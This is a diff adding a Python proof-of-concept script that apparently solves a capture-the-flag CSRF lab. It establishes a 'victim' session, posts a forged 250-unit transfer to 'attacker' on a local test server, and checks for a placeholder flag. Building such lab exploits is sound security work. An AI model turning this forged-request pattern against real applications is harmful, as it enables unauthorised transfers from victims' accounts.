@@ -1,0 +1,37 @@
+import argparse
+import requests
+import sys
+
+SUCCESS_SIGNATURE = '__SUCCESS_SIGNATURE__'
+FLAG_TOKEN = '__FLAG_TOKEN__'
+
+def exploit(base_url: str) -> bool:
+    session = requests.Session()
+    base = base_url.rstrip('/')
+    try:
+        login_resp = session.get(base + '/login', params={'user': 'victim'}, timeout=5)
+        login_resp.raise_for_status()
+        resp = session.post(base + '/transfer', data={'recipient': 'attacker', 'amount': '250'}, timeout=5)
+        resp.raise_for_status()
+    except requests.RequestException as exc:
+        print(f'[csrf-compiler] request failed: {exc}', file=sys.stderr)
+        return False
+    try:
+        payload = resp.json()
+    except ValueError:
+        return False
+    return payload.get('ok') is True and str(payload.get('recipient')) == 'attacker' and str(payload.get('amount')) == '250' and str(payload.get('flag')) == FLAG_TOKEN
+
+def main() -> None:
+    parser = argparse.ArgumentParser(description='CSRF compiler PoC')
+    parser.add_argument('--base-url', default='http://127.0.0.1:__PORT__')
+    args = parser.parse_args()
+    if exploit(args.base_url):
+        print(SUCCESS_SIGNATURE)
+        print(FLAG_TOKEN)
+        raise SystemExit(0)
+    print('[csrf-compiler] exploit did not succeed', file=sys.stderr)
+    raise SystemExit(1)
+
+if __name__ == '__main__':
+    main()
